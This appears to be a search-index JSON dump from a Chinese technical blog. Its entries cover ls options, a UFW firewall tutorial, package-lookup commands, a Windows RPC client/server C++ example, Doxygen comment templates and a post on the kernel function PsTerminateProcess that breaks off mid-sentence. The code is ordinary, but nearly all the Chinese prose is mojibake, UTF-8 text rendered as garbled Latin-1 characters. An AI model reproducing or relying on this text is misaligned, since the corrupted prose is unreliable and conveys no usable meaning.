ä»…æ˜¾ç¤ºç›®å½•åï¼Œè€Œä¸æ˜¾ç¤ºç›®å½•ä¸‹çš„å†…å®¹åˆ—è¡¨ï¼Œ æ˜¾ç¤ºç¬¦å·é“¾æ¥æ–‡ä»¶æœ¬èº«ï¼Œ è€Œä¸æ˜¾ç¤ºå…¶æŒ‡å®šçš„ç›®å½•åˆ—è¡¨ã€‚ -F: åœ¨æ¯ä¸ªè¾“å‡ºé¡¹åæœ€ä½³æ–‡ä»¶çš„ç±»å‹æ ‡è¯†ç¬¦ï¼Œ * å¯æ‰§è¡Œæƒé™çš„æ™®é€šæ–‡ä»¶ï¼Œ/ è¡¨ç¤ºç›®å½•ï¼Œ @ è¡¨ç¤ºç¬¦å·é“¾æ¥ï¼Œ|è¡¨ç¤ºå‘½ä»¤ç®¡é“ï¼Œ = è¡¨ç¤ºsockets å¥—æ¥å­—ï¼Œ æ™®é€šæ–‡ä»¶ä¸è¾“å‡ºæ ‡è¯†ç¬¦ã€‚ -h: ä»¥humanæ˜“è¯»æ ¼å¼æ˜¾ç¤ºï¼Œ æ–‡ä»¶å¤§å°ä»¥kb,mbæ˜¾ç¤º -i : æ˜¾ç¤ºæ–‡ä»¶ç´¢å¼•èŠ‚ç‚¹å·ï¼ˆinodeï¼‰,ä¸€ä¸ªç´¢å¼•èŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªæ–‡ä»¶ -l : ä»¥é•¿æ ¼å¼æ˜¾ç¤ºç›®å½•ä¸‹çš„å†…å®¹åˆ—è¡¨ï¼Œè¾“å‡ºä¿¡æ¯ï¼šæ–‡ä»¶åï¼Œæ–‡ä»¶ç±»å‹ï¼Œæƒé™æ¨¡å¼ï¼Œç¡¬é“¾æ¥æ•°ï¼Œæ‰€æœ‰è€…ï¼Œç»„ï¼Œæ–‡ä»¶å¤§å°ï¼Œ æ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´ã€‚ ls - l å‘½ä»¤å°±æ˜¯å¸¸ç”¨ ll -L : å¦‚æœé‡åˆ°æ€§è´¨ä¸ºç¬¦å·é“¾æ¥çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œ ç›´æ¥åˆ—å‡ºè¯¥é“¾æ¥æ‰€é€ çš„åŸå§‹æ–‡ä»¶æˆ–ç›®å½• -m: ä»¥é€—å·åˆ†éš”æ¯ä¸ªæ–‡ä»¶å’Œç›®å½•çš„åç§° -n : ä»¥ç”¨æˆ·æ ‡å¿—ç å’Œç¾¤ç»„è¯†åˆ«ç æ›¿ä»£å…¶åç§°uid /gid -r : ä»¥æ–‡ä»¶åååºæ’åºå¹¶è¾“å‡ºç›®å½•å†…å®¹åˆ—è¡¨ -Rï¼šé€’å½’å¤„ç†ï¼Œå°†åˆ¶å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç† -s : æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„å¤§å°ï¼Œ ä»¥åŒºå—ä¸ºå•ä½ -t : ç”¨æ–‡ä»¶å’Œç›®å½•çš„æ›´æ”¹æ—¶é—´æ’åº","tags":[{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"å‘½ä»¤","slug":"å‘½ä»¤","permalink":"https://hodlyounger.github.io/tags/%E5%91%BD%E4%BB%A4/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Command-Tools/"}]},{"title":"ã€linuxé˜²ç«å¢™ã€‘å‘½ä»¤â€”â€”ufw","date":"2023-10-27T01:24:01.838Z","path":"A_OS/Linux/Command&Tools/ã€linuxé˜²ç«å¢™ã€‘ufw/","text":"æ¦‚è¿°ï¼šé˜²ç«å¢™æ˜¯è®¡ç®—æœºå®‰å…¨çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚åœ¨Linuxä¸­ï¼ŒUFWï¼ˆUncomplicated Firewallï¼‰æ˜¯ä¸€ä¸ªå¼€æºé˜²ç«å¢™å·¥å…·ï¼Œå¯ç”¨äºå®ç°ç½‘ç»œå®‰å…¨ç­–ç•¥ã€‚å®ƒæä¾›äº†ä¸€ä¸ªç®€åŒ–çš„å‘½ä»¤è¡Œæ¥å£ï¼Œä½¿å¾—è®¾ç½®é˜²ç«å¢™è§„åˆ™æ›´åŠ å®¹æ˜“ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»å¦‚ä½•åœ¨Linuxä¸Šä½¿ç”¨UFWå®ç°é˜²ç«å¢™å’Œå®‰å…¨ç­–ç•¥ã€‚ [toc] å®‰è£…UFW è®¸å¤šLinuxå‘è¡Œç‰ˆéƒ½é»˜è®¤å®‰è£…äº†UFWã€‚å¦‚æœä½ çš„Linuxå‘è¡Œç‰ˆæ²¡æœ‰å®‰è£…ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…ï¼š 1$ sudo apt-get install ufw # Ubuntuå’ŒDebian 1$ sudo yum install ufw # CentOSå’ŒFedora è®¾ç½®UFWè§„åˆ™ åœ¨ä½¿ç”¨UFWä¹‹å‰ï¼Œå¿…é¡»å¯ç”¨å®ƒã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¯ç”¨UFWï¼š 1$ sudo ufw enable é»˜è®¤æƒ…å†µä¸‹ï¼ŒUFWå°†æ‹’ç»æ‰€æœ‰ä¼ å…¥è¿æ¥å’Œå…è®¸æ‰€æœ‰ä¼ å‡ºè¿æ¥ã€‚è¦æ·»åŠ å…¶ä»–è§„åˆ™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1$ sudo ufw allow [port]/[protocol] ä¾‹å¦‚ï¼Œå¯ç”¨SSHè¿æ¥ï¼š 1$ sudo ufw allow ssh é»˜è®¤æƒ…å†µä¸‹ï¼ŒUFWå‡å®šTCPåè®®ã€‚å¦‚æœè¦å…è®¸å…¶ä»–åè®®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1$ sudo ufw allow [port]/[protocol] ä¾‹å¦‚ï¼Œå¯ç”¨UDPè¿æ¥ï¼š 1$ sudo ufw allow 53/udp æ‚¨è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–é€‰é¡¹æŒ‡å®šæºåœ°å€ï¼Œç›®æ ‡åœ°å€å’Œåº”ç”¨ç¨‹åºã€‚ é™åˆ¶IPè®¿é—® é™¤äº†ç«¯å£ï¼Œè¿˜å¯ä»¥ä½¿ç”¨UFWé™åˆ¶å¯¹ç‰¹å®šIPçš„è®¿é—®ã€‚ä¾‹å¦‚ï¼Œè¦æ‹’ç»æ¥è‡ªIPåœ°å€ä¸º192.168.1.100çš„æ‰€æœ‰è¿æ¥ï¼š 1$ sudo ufw deny from 192.168.1.100 æˆ–è€…ï¼Œè¦å…è®¸ä»…è¯¥IPåœ°å€è®¿é—®æ‚¨çš„ç½‘ç«™ï¼š 1$ sudo ufw allow from 192.168.1.100 to any port 80 ä¿®æ”¹é»˜è®¤ç­–ç•¥ æ‚¨å¯ä»¥é€šè¿‡ä¿®æ”¹é»˜è®¤ç­–ç•¥æ¥æ›´æ”¹UFWçš„è¡Œä¸ºã€‚è¦å…è®¸æ‰€æœ‰ä¼ å…¥è¿æ¥å¹¶æ‹’ç»æ‰€æœ‰ä¼ å‡ºè¿æ¥ï¼š 1$ sudo ufw default deny outgoing 1$ sudo ufw default allow incoming æˆ–è€…ï¼Œè¦æ‹’ç»æ‰€æœ‰ä¼ å…¥è¿æ¥å¹¶å…è®¸æ‰€æœ‰ä¼ å‡ºè¿æ¥ï¼š 1$ sudo ufw default allow outgoing 1$ sudo ufw default deny incoming æ’¤æ¶ˆè§„åˆ™ å¦‚æœæ‚¨éœ€è¦åˆ é™¤è§„åˆ™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1$ sudo ufw delete [è§„åˆ™å·] è§„åˆ™å·æ˜¯è§„åˆ™åˆ—è¡¨ä¸­çš„æ•°å­—åºå·ï¼Œä»1å¼€å§‹ã€‚ ç¦ç”¨UFW è¦ç¦ç”¨UFWå¹¶åˆ é™¤æ‰€æœ‰è§„åˆ™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1$ sudo ufw disable 1$ sudo ufw reset ç»“è®º åœ¨Linuxä¸Šä½¿ç”¨UFWå¯ä»¥è½»æ¾å®ç°é˜²ç«å¢™å’Œå®‰å…¨ç­–ç•¥ã€‚UFWæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹å¼æ¥æ§åˆ¶å…¥ç«™å’Œå‡ºç«™æµé‡ï¼Œå¹¶ä¸”æ˜“äºä½¿ç”¨å’Œé…ç½®ã€‚é€šè¿‡è®¾ç½®è‰¯å¥½çš„è§„åˆ™ï¼Œå¯ä»¥å¢å¼ºç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚","tags":[{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://hodlyounger.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Command-Tools/"}]},{"title":"LinuxæŸ¥è¯¢æ˜¯å¦å®‰è£…äº†æŸä¸ªè½¯ä»¶","date":"2023-10-27T01:24:01.837Z","path":"A_OS/Linux/Command&Tools/LinuxæŸ¥è¯¢æ˜¯å¦å®‰è£…æŸä¸ªè½¯ä»¶/","text":"1ã€rpmåŒ…å®‰è£…çš„ï¼Œå¯ä»¥ç”¨rpm -qaçœ‹åˆ°ï¼Œå¦‚æœè¦æŸ¥æ‰¾æŸè½¯ä»¶åŒ…æ˜¯å¦å®‰è£…ï¼Œç”¨ rpm -qa | grep â€œè½¯ä»¶æˆ–è€…åŒ…çš„åå­—â€ã€‚ 1rpm -qa | grep ruby 2ã€ä»¥debåŒ…å®‰è£…çš„ï¼Œå¯ä»¥ç”¨dpkg -lèƒ½çœ‹åˆ°ã€‚å¦‚æœæ˜¯æŸ¥æ‰¾æŒ‡å®šè½¯ä»¶åŒ…ï¼Œç”¨dpkg -l | grep â€œè½¯ä»¶æˆ–è€…åŒ…çš„åå­—â€ï¼› 1dpkg -l | grep ruby 3ã€yumæ–¹æ³•å®‰è£…çš„ï¼Œå¯ä»¥ç”¨yum list installedæŸ¥æ‰¾ï¼Œå¦‚æœæ˜¯æŸ¥æ‰¾æŒ‡å®šåŒ…ï¼Œå‘½ä»¤ååŠ  | grep â€œè½¯ä»¶åæˆ–è€…åŒ…åâ€ï¼› 1yum list installed | grep ruby","tags":[{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"æŸ¥è¯¢","slug":"æŸ¥è¯¢","permalink":"https://hodlyounger.github.io/tags/%E6%9F%A5%E8%AF%A2/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Command-Tools/"}]},{"title":"ã€windowsã€‘é€šè¿‡PIDè·å–è¿›ç¨‹æ‰“å¼€çš„ç«¯å£","date":"2023-10-26T16:00:00.000Z","path":"A_OS/Windows/win/ã€winã€‘é€šè¿‡PIDè·å–è¿›ç¨‹æ‰“å¼€çš„ç«¯å£/","text":"1","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"win","slug":"A-OS/Windows/win","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/win/"}]},{"title":"ã€RPCã€‘è°ƒç”¨è¿‡ç¨‹å®ä¾‹è¯¦è§£","date":"2023-10-26T01:45:19.019Z","path":"A_OS/Windows/RPC/ã€RPCã€‘è°ƒç”¨è¿‡ç¨‹å®ä¾‹è¯¦è§£/","text":"æ¦‚è¿°ï¼šwindows åˆ›å»º RPCè°ƒç”¨è¿‡ç¨‹å®ä¾‹è¯¦è§£ [toc] 0x01ã€ç”Ÿæˆ UUID å’Œæ¨¡ç‰ˆ(IDL)æ–‡ä»¶ å®šä¹‰æ¥å£çš„ç¬¬ä¸€æ­¥æ˜¯ä½¿ç”¨ uuidgen å®ç”¨å·¥å…·ç”Ÿæˆé€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆUUIDï¼‰ã€‚UUIDä½¿å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯èƒ½å¤Ÿç›¸äº’è¯†åˆ«ã€‚è¯¥å·¥å…·åŒ…å«åœ¨é˜¿åº„å¹³å°è½¯ä»¶å¼€å‘å·¥å…·åŒ…ä¸­ï¼ˆSDKï¼‰ã€‚ ä¸€èˆ¬å®‰è£…è·¯å¾„ä½äºï¼šD:\\Windows Kits\\10\\bin\\10.0.22621.0\\x64 ä»¥ä¸‹å‘½ä»¤ç”Ÿæˆ UUID å¹¶åˆ›å»ºåä¸º Hello.idl çš„æ¨¡ç‰ˆæ–‡ä»¶ã€‚ 1uuidgen /i /ohello.idl æ¨¡ç‰ˆå†…å®¹å¤§è‡´å¦‚ä¸‹ï¼š 12345678[ uuid(7a98c250-6808-11cf-b73b-00aa00b677a7), version(1.0)]interface hello&#123; &#125; åœ¨æ¨¡ç‰ˆä¸­æ·»åŠ æ¥å£ï¼š 12345678910//file hello.idl[ uuid(7a98c250-6808-11cf-b73b-00aa00b677a7), version(1.0)]interface hello&#123; void HelloProc([in, string] unsigned char * pszString); void Shutdown(void);&#125; 0x02ã€æ·»åŠ  acf æ–‡ä»¶ acfæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼Œå¯¼å‡ºæ¥å£éœ€è¦ä¸ idl æ–‡ä»¶ä¸€è‡´ï¼š 1234567//file: hello.acf[ implicit_handle (handle_t hello_IfHandle)] interface hello&#123;&#125; 0x03ã€ç¼–è¯‘ idl æ–‡ä»¶ æ‰“å¼€ visual studioï¼Œæ–°å»ºä¸€ä¸ªç©ºé¡¹ç›® ç©ºé¡¹ç›®ä¸­æ·»åŠ ä¸Šè¿° idlæ–‡ä»¶ å’Œ acfæ–‡ä»¶ ç¼–è¯‘é¡¹ç›® ç”Ÿæˆ hello_h.hã€hello_c.cã€hello_s.c hello_h.h: æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å…±ç”¨æ–‡ä»¶ hello_c.c: å®¢æˆ·ç«¯æ–‡ä»¶ hello_s.c: æœåŠ¡ç«¯æ–‡ä»¶ éœ€è¦è¡¥å……è¯´æ˜çš„æ˜¯ï¼Œåœ¨ hello_h.h å¤´æ–‡ä»¶ä¸­æœ‰ä¸¤ä¸ªå¯¼å‡ºæ¥å£ï¼Œå¯¼å‡ºæ¥å£å³ä¸ºrpcè°ƒç”¨çš„æ¥å£ã€‚ 12extern RPC_IF_HANDLE hello_v1_0_c_ifspec;extern RPC_IF_HANDLE hello_v1_0_s_ifspec; åŒ…å«å‡½æ•° å‡½æ•°MIDL_user_allocateå’ŒMIDL_user_freeç”¨äºä¸ºRPCå­˜æ ¹åˆ†é…å’Œé‡Šæ”¾å†…å­˜ã€‚ MIDL_user_allocateå’ŒMIDL_user_freeåœ¨å®ç°RPCåº”ç”¨ç¨‹åºæ—¶ï¼Œå®ƒä»¬å¿…é¡»åœ¨åº”ç”¨ç¨‹åºçš„æŸä¸ªåœ°æ–¹å®šä¹‰,è¿™é‡Œç›´æ¥åœ¨ä¸»æ–‡ä»¶å®šä¹‰å³å¯ã€‚ 12345678910//åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å®ç°ä¸­éƒ½è¦åŒ…å«è¿™ä¸¤ä¸ªå‡½æ•°void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)&#123; return(malloc(len));&#125;void __RPC_USER midl_user_free(void __RPC_FAR *ptr)&#123; free(ptr);&#125; 0x04ã€å®¢æˆ·ç«¯ æ–°å»ºå·¥ç¨‹æ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š clientrpc.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293//client.cpp#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;#include &quot;hello_h.h&quot;#pragma comment(lib,&quot;Rpcrt4.lib&quot;)void doRpcCall();int main(int argc, char** argv)&#123; int i = 0; RPC_STATUS status = 0; unsigned char* pszNetworkAddr = NULL; unsigned char* pszStringBinding = NULL; for (i = 1; i &lt; argc; i++) &#123; if (strcmp(argv[i], &quot;-ip&quot;) == 0) &#123; pszNetworkAddr = (unsigned char*)argv[++i]; break; &#125; &#125; status = RpcStringBindingCompose(NULL, (unsigned char*)&quot;ncacn_np&quot;, pszNetworkAddr, (unsigned char*)&quot;\\\\pipe\\\\hello&quot;, NULL, &amp;pszStringBinding); if (status != 0) &#123; cout &lt;&lt; &quot;RpcStringBindingCompose returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; return -1; &#125; cout &lt;&lt; &quot;pszStringBinding = &quot; &lt;&lt; pszStringBinding &lt;&lt; endl; status = RpcBindingFromStringBinding(pszStringBinding, &amp;hello_IfHandle); if (status != 0) &#123; cout &lt;&lt; &quot;RpcBindingFromStringBinding returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; return -1; &#125; doRpcCall(); status = RpcStringFree(&amp;pszStringBinding); if (status != 0) cout &lt;&lt; &quot;RpcStringFree returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; status = RpcBindingFree(&amp;hello_IfHandle); if (status != 0) cout &lt;&lt; &quot;RpcBindingFree returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; cin.get(); return 0;&#125;void doRpcCall(void)&#123; char buff[1024]; RpcTryExcept&#123; while (true) &#123; cout &lt;&lt; &quot;Please input a string param for Rpc call:&quot; &lt;&lt; endl; cin.getline(buff, 1023); if (strcmp(buff, &quot;exit&quot;) == 0 || strcmp(buff, &quot;quit&quot;) == 0) &#123; Shutdown(); &#125; else &#123; HelloProc((unsigned char*)buff); cout &lt;&lt; &quot;call helloproc succeed!&quot; &lt;&lt; endl; &#125; &#125; &#125; RpcExcept(1) &#123; unsigned long ulCode = RpcExceptionCode(); cout &lt;&lt; &quot;RPC exception occured! code: &quot; &lt;&lt; ulCode &lt;&lt; endl; &#125; RpcEndExcept&#125;void* __RPC_USER MIDL_user_allocate(size_t len)&#123; return (malloc(len));&#125;void __RPC_USER MIDL_user_free(void* ptr)&#123; free(ptr);&#125; 0x05ã€æœåŠ¡ç«¯ æ–°å»ºå·¥ç¨‹æ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š serverrpc.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;using namespace std;#include &quot;hello_h.h&quot;#pragma comment(lib,&quot;Rpcrt4.lib&quot;)int main(void)&#123; RPC_STATUS status = 0; unsigned int mincall = 1; unsigned int maxcall = 20; status = RpcServerUseProtseqEp( (unsigned char*)&quot;ncacn_np&quot;, maxcall, (unsigned char*)&quot;\\\\pipe\\\\hello&quot;, NULL); if (status != 0) &#123; cout &lt;&lt; &quot;RpcServerUseProtseqEp returns: &quot; &lt;&lt; status &lt;&lt; endl; return -1; &#125; status = RpcServerRegisterIf( hello_v1_0_s_ifspec, NULL, NULL); if (status != 0) &#123; cout &lt;&lt; &quot;RpcServerRegisterIf returns: &quot; &lt;&lt; status &lt;&lt; endl; return -1; &#125; cout &lt;&lt; &quot;Rpc Server Begin Listening...&quot; &lt;&lt; endl; status = RpcServerListen(mincall, maxcall, FALSE); if (status != 0) &#123; cout &lt;&lt; &quot;RpcServerListen returns: &quot; &lt;&lt; status &lt;&lt; endl; return -1; &#125; cin.get(); return 0;&#125;/************************************************************************//* MIDL malloc &amp; free *//************************************************************************/void* __RPC_USER MIDL_user_allocate(size_t len)&#123; return (malloc(len));&#125;void __RPC_USER MIDL_user_free(void* ptr)&#123; free(ptr);&#125;/************************************************************************//* Interfaces *//************************************************************************/void HelloProc(unsigned char* szhello)&#123; cout &lt;&lt; szhello &lt;&lt; endl;&#125;void Shutdown(void)&#123; RPC_STATUS status = 0; status = RpcMgmtStopServerListening(NULL); if (status != 0) &#123; cout &lt;&lt; &quot;RpcMgmtStopServerListening returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; &#125; status = RpcServerUnregisterIf(NULL, NULL, FALSE); if (status != 0) &#123; cout &lt;&lt; &quot;RpcServerUnregisterIf returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; &#125;&#125; 0x06ã€ç¼–è¯‘å¹¶è¿è¡Œ åˆ†åˆ«ç¼–è¯‘å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç¨‹åºï¼Œå¾—åˆ° server.exe å’Œ client.exe å…ˆè¿è¡Œ server.exe åœ¨ client.exe ç›®å½•è¿è¡Œ client -ip 192.168.106.128 æ¥å¯åŠ¨å®¢æˆ·ç«¯ç¨‹åºå¹¶ä¸æœåŠ¡å™¨ç«¯ç›¸è¿ åœ¨ client çš„çª—å£è¾“å…¥ä»»æ„å­—ç¬¦ä¸²ï¼Œå›è½¦åå¯çœ‹åˆ°serverçª—å£ä¸Šæœ‰æ˜¾ç¤º åœ¨ client çª—å£å†… è¾“å…¥ exit æˆ– quit, server çª—å£å…³é—­ 0x07ã€è¿è¡Œç¤ºä¾‹ Client Server","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"RPC","slug":"RPC","permalink":"https://hodlyounger.github.io/tags/RPC/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/RPC/"}]},{"title":"ã€Visual Studioã€‘Doxygenæ³¨é‡Š.md","date":"2023-10-25T16:00:00.000Z","path":"A_OS/Windows/Visual Studio/ã€Visual Studioã€‘Doxygenæ³¨é‡Š/","text":"æ¦‚è¿°ï¼š Doxygen æ³¨é‡ŠåŠä½¿ç”¨ C++ç‰ˆ å‚è€ƒæ–‡ç« ï¼š Doxygen Manual: Documenting the code Doxygen - æ²»å¥½äº†æˆ‘çš„ä»£ç æ³¨é‡Šå¼ºè¿«ç—‡ - çŸ¥ä¹ Doxygen æ³¨é‡Šè¯­æ³•å’Œä½¿ç”¨-CSDNåšå®¢ è¿™é‡Œå±•ç¤ºä¸€äº›å¸¸ç”¨åˆ°çš„æ–‡ä»¶æ³¨é‡Š 0x01 æ–‡ä»¶å¤´ 1234567891011/** * @file æ–‡ä»¶å * @brief ç®€ä»‹ * @details ç»†èŠ‚ * @mainpage å·¥ç¨‹æ¦‚è§ˆ * @author ä½œè€… * @email é‚®ç®± * @version ç‰ˆæœ¬å· * @date å¹´-æœˆ-æ—¥ * @license ç‰ˆæƒ */ 0x02 å‡½æ•°å¤´ 12345678910111213/** * @brief å‡½æ•°ç®€ä»‹ * @detail è¯¦ç»†è¯´æ˜ * * @param å½¢å‚ å‚æ•°è¯´æ˜ * @param å½¢å‚ å‚æ•°è¯´æ˜ * @return è¿”å›è¯´æ˜ * @retval è¿”å›å€¼è¯´æ˜ * @note æ³¨è§£ * @attention æ³¨æ„ * @warning è­¦å‘Š * @exception å¼‚å¸¸ */ 0x03 ç±»å®šä¹‰ 1234/*** @brief ç±»çš„ç®€å•æ¦‚è¿°* ç±»çš„è¯¦ç»†æ¦‚è¿°*/ 0x04 æ‰¹æ³¨ 12345678/*!&lt; ... æ‰¹æ³¨ ... *//**&lt; ... æ‰¹æ³¨ ... */ ï¼ˆæ¨èï¼‰//!&lt; ... æ‰¹æ³¨ ...///&lt; ... æ‰¹æ³¨ ... ï¼ˆæ¨èï¼‰ Example:using apollo::common::ErrorCode; ///&lt;é”™è¯¯ç using apollo::common::Status; ///&lt;çŠ¶æ€ 0x05 API æ³¨é‡Š 12345678910111213141516171819202122232425262728/* GLOBAL FUNCTIONS *//** * @brief Example showing how to document a function with Doxygen. * * Description of what the function does. This part may refer to the parameters * of the function, like @p param1 or @p param2. A word of code can also be * inserted like @c this which is equivalent to &lt;tt&gt;this&lt;/tt&gt; and can be useful * to say that the function returns a @c void or an @c int. If you want to have * more than one word in typewriter font, then just use @&lt;tt@&gt;. * We can also include text verbatim, * when the language is not the one used in the current source file (but * &lt;b&gt;be careful&lt;/b&gt; as this may be supported only by recent versions * of Doxygen). By the way, &lt;b&gt;this is how you write bold text&lt;/b&gt; or, * if it is just one word, then you can just do @b this. * * @param [in] param1 Description of the first parameter of the function. * @param [out] param2 The second one, which follows @p param1, and represents output. * * @return Describe what the function returns. * @retval XXX_OK if successful. * * @see doxygen_theSecondFunction * @see Box_The_Last_One * @see &lt;http://website/&gt; * @note Something to note. * @warning Warning. */int doxygen_theFirstFunction(int param1, int param2); 0x06 ç»“æ„ä½“æ³¨é‡Š 1234567891011/** * @brief Use brief, otherwise the index won&#x27;t have a brief explanation. * * Detailed explanation. */typedef struct BoxStruct&#123; int a; /**&lt; Some documentation for the member BoxStruct#a. */ int b; /**&lt; Some documentation for the member BoxStruct#b. */ double c; /**&lt; Etc. */&#125; tBoxStruct; 0x07 ç‰ˆæƒå£°æ˜ 123/***************************************************************************** * Portfolio Info ****************************************************************************/","tags":[{"name":"windows/visual-studio","slug":"windows-visual-studio","permalink":"https://hodlyounger.github.io/tags/windows-visual-studio/"},{"name":"Doxygen","slug":"Doxygen","permalink":"https://hodlyounger.github.io/tags/Doxygen/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ã€windowsã€‘PsTerminateProcess ç»“æŸè¿›ç¨‹","date":"2023-10-25T16:00:00.000Z","path":"A_OS/Windows/è¿›ç¨‹çº¿ç¨‹/ã€winã€‘PsTerminateProcess ç»“æŸè¿›ç¨‹/","text":"æ¦‚è¿°ï¼šä½¿ç”¨ PsTerminateProcess ç»“æŸè¿›ç¨‹ å‚è€ƒæ–‡ç« ï¼š PsTerminateProcessç»“æŸè¿›ç¨‹ - gussing - åšå®¢å›­ [åŸåˆ›]å¼ºåˆ¶å…³é—­è¿›ç¨‹çš„ä¸¤ç§æ–¹æ³•-ç¼–ç¨‹æŠ€æœ¯-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com ä½¿ç”¨ PspTerminateThreadByPointer å¼ºåˆ¶ç»“æŸè¿›ç¨‹-CSDNåšå®¢ PspTerminateProcessæœªæ–‡æ¡£åŒ–å‡½æ•°å¯¼å‡ºç»ˆæ­¢è¿›ç¨‹ - zpchcbd - åšå®¢å›­ 0x01 PsTerminateProcess è¯´æ˜ å®šä¹‰åŠå®ç° PsTerminateProcess å‡½æ•°ç”¨äºç»“æŸä¸€ä¸ªè¿›ç¨‹ã€‚å…¶å£°æ˜å¦‚ä¸‹æ‰€ç¤ºï¼š 123NTSTATUSNTAPIPsTerminateProcess(IN PEPROCESS Process, IN NTSTATUS ExitStatus) å…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ PEPROCESS çš„æŒ‡é’ˆï¼Œå¦‚æœä½ åªçŸ¥é“pidï¼Œå¯ä»¥é€šè¿‡ PsLookupProcessByProcessId è·å¾—ï¼Œè€Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šé€€å‡ºçŠ¶æ€ç ã€‚ PsTerminateProcess å‡½æ•°çš„å®ç°éå¸¸ç®€å•ï¼Œå°±æ˜¯è°ƒç”¨äº† PspTerminateProcess PsTerminateProcess çš„å®ç° 12345678NTSTATUSNTAPIPsTerminateProcess(IN PEPROCESS Process, IN NTSTATUS ExitStatus)&#123; /* Call the internal API */ return PspTerminateProcess(Process, ExitStatus);&#125; PsTerminateProcess æ˜¯ä¸€ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œè€Œ PspTerminateProcess æ˜¯ä¸€ä¸ªå†…éƒ¨å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ åªè¦åŒ…å«çš„æ­£ç¡®çš„å¤´æ–‡ä»¶ï¼Œå°±å¯ä»¥ä½¿ç”¨ 